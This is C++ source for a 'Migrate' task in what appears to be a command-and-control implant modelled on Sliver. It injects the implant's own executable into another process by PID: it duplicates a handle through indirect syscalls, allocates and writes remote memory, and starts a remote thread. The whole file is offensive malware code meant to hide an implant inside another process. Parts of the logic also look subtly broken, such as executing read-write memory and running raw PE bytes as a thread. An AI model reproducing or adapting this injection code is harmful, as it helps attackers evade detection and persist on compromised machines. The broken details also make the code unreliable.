#include "core/task.hpp"

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

namespace Task
{
    // Reference:
    // https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L135
    std::wstring Migrate(State::PSTATE pState, const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // HANDLE hCurrProcess = GetCurrentProcess();
        HANDLE hCurrProcess = NtCurrentProcess();

        // Get the current process executable file name to migrate.
        WCHAR execName[MAX_PATH*4];

        DWORD dwFileLen = GetProcessImageFileNameW(
            hCurrProcess,
            const_cast<LPWSTR>(execName),
            MAX_PATH*4
        );
        if (dwFileLen == 0)
        {
            return L"Error: Failed to get the current process executable file name.";
        }

        // Read the executable file data to write process memory.
        std::vector<BYTE> bytes = System::Fs::FileRead(pState->pProcs, std::wstring(execName));
        LPVOID lpBuffer     = bytes.data();
        SIZE_T dwBufferLen  = bytes.size();

        // Open the source process to duplicate.
        HANDLE hSrcProcess = System::Process::ProcessOpen(
            pState->pProcs,
            dwPid,
            PROCESS_DUP_HANDLE
        );
        if (!hSrcProcess)
        {
            return L"Error: Failed to open the target process handle.";
        }

        HANDLE hDup;

        NTSTATUS status = CallSysInvoke(
            &pState->pProcs->sysNtDuplicateObject,
            pState->pProcs->lpNtDuplicateObject,
            hSrcProcess,
            hCurrProcess,
            hCurrProcess,
            &hDup,
            0,
            0,
            DUPLICATE_SAME_ACCESS
        );
        if (status != STATUS_SUCCESS)
        {
            return L"Error: Failed to duplicate handle.";
        }

        LPVOID pRemoteAddr = System::Process::VirtualMemoryAllocate(
            pState->pProcs,
            hDup,
            dwBufferLen,
            MEM_COMMIT,
            PAGE_READWRITE
        );

        DWORD dwWritten;
        if (!System::Process::VirtualMemoryWrite(
            pState->pProcs,
            hDup,
            pRemoteAddr,
            lpBuffer,
            dwBufferLen,
            (PSIZE_T)&dwWritten
        ) || dwWritten != bytes.size()) {
            return L"Error: Failed to write target process memory.";
        }

        HANDLE hThread = System::Process::RemoteThreadCreate(
            pState->pProcs,
            hDup,
            (LPTHREAD_START_ROUTINE)pRemoteAddr,
            nullptr
        );
        if (!hThread)
        {
            return L"Error: Failed to create remote thread on the target process.";
        }

        // Terminate the current (original) process.
        // if (System::Process::ProcessTerminate(
        //     pState->pProcs,
        //     hCurrProcess,
        //     EXIT_SUCCESS
        // )) {
        //     return L"Error: Failed to terminate the current process.";
        // }

        return L"Success: Migrated successfully.";
    }
}
